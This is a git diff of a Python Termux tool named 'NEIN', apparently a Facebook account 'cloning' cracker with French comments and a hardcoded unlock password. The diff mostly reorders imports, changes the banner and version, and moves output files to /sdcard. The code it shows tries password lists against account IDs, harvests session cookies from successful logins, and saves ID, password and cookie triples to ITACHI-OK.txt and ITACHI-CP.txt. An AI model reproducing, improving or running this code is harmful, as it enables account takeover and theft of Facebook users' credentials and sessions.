@@ -1,15 +1,14 @@
-import getpass
-import subprocess
 import os
-from os import system as clr
 import random
 import string 
-from concurrent.futures import ThreadPoolExecutor as tred
-import requests
-import re
-import sys
 import uuid
 import json
+import subprocess
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests
+import sys
+import secrets
+import getpass
 
 # Mot de passe pour déverrouiller le script
 mot_de_passe = "ITACHI2024"
@@ -37,40 +36,41 @@ bblue="\033[1;34m"          # Blue
 P="\033[1;35m"        # Purple
 C="\033[1;36m"          # Cyan
 B="\033[1;37m"         # White
-my_color = [B,C,P,H]
+my_color = [
+ B,C,P,H]
 warna = random.choice(my_color)
 oks=[]
 cps=[]
 loop=0
-
 #-------------logo-----------------#
 logo=(f'''{B}
- _____  ___    _______   __    _____  ___   
-(\"   \|"  \  /"     "| |" \  (\"   \|"  \  
-|.\\   \    |(: ______) ||  | |.\\   \    | 
-|: \.   \\  | \/    |   |:  | |: \.   \\  | 
-|.  \    \. | // ___)_  |.  | |.  \    \. | 
-|    \    \ | (:      "| /\  |\|    \    \ | 
- \___|\____\) \_______)(__\_|_)\___|\____\) 
-                                            
-{warna}--------------------------------------------{B}
- Owner    : CHRICE999
- TOOL NAME : NEIN
- GROUPE-FB   : [TERMUX-COMAND]
- STATUE : FREE
- Facebook : {bblue}ITACHI SQ{bblue}
- Tools    : {warna}[{M}VERSION 1.1{warna}]{warna}
---------------------------------------------{B}''')
 
+
+                                 
+,--.  ,--.,------.,--.,--.  ,--. 
+|  ,'.|  ||  .---'|  ||  ,'.|  | 
+|  |' '  ||  `--, |  ||  |' '  | 
+|  | `   ||  `---.|  ||  | `   | 
+`--'  `--'`------'`--'`--'  `--' 
+                                 
+
+                                            
+
+{warna}--------------------------------------------{B}
+ Owner    : {M}CHRICE999{M}
+ TOOL NAME : {warna}{P}NEIN{P}{warna}
+ GROUPE-FB   : [TERMUX-COMAND]
+ STATUE : {H}FREE{H}
+ Facebook : {bblue}ITACHI SQ{bblue}
+ Tools    : {warna}[{M}VERSION 1.3{warna}]{warna}
+--------------------------------------------{B}''')
 #-------------linex def -------------#
 def linex():
     print(f'{warna}--------------------------------------------{B}')
-
 #-------------clear def -------------#
 def clear():
-    clr('clear')
+    os.system('clear')
     print(logo)
-
 #-------------main def------------#
 def MR_ITACHI():
     clear()
@@ -83,7 +83,6 @@ def MR_ITACHI():
         BD_CLONING()
     else:
         exit(' MERCI BEAUCOUP  :)')
-
 #------------- bd clone def ----------#
 def BD_CLONING():
     user=[]
@@ -117,7 +116,6 @@ def BD_CLONING():
     print(' TOTAL CP ID '+str(len(cps)))
     input(' PRESS ENTER TO BACK  : ')
     MR_ITACHI()
-
 #------------ method crack def ---------#
 def method_crack(ids, passlist):
     global oks
@@ -145,17 +143,17 @@ def method_crack(ids, passlist):
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;32m [COOKIES] '+coki)
                     # Vérifier si le dossier ITACHI-IDS existe et le créer si nécessaire
-                    if not os.path.exists("ITACHI-IDS"):
-                        os.makedirs("ITACHI-IDS")
+                    if not os.path.exists("/sdcard/ITACHI-IDS"):
+                        os.makedirs("/sdcard/ITACHI-IDS")
                     # Enregistrer dans le fichier ITACHI-OK.txt
-                    with open(os.path.join("ITACHI-IDS", "ITACHI-OK.txt"), 'a') as f:
+                    with open(os.path.join("/sdcard/ITACHI-IDS", "ITACHI-OK.txt"), 'a') as f:
                         f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
                 print('\r\r \033[1;30m[ITACHI-CP] '+ids+' | '+pas+'\033[1;37m')
                 # Enregistrer dans le fichier ITACHI-CP.txt
-                with open(os.path.join("ITACHI-IDS", "ITACHI-CP.txt"), 'a') as f:
+                with open(os.path.join("/sdcard/ITACHI-IDS", "ITACHI-CP.txt"), 'a') as f:
                     f.write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
@@ -164,6 +162,5 @@ def method_crack(ids, passlist):
         loop+=1
     except:
         pass
-
 #-------------end----------------#
 MR_ITACHI()
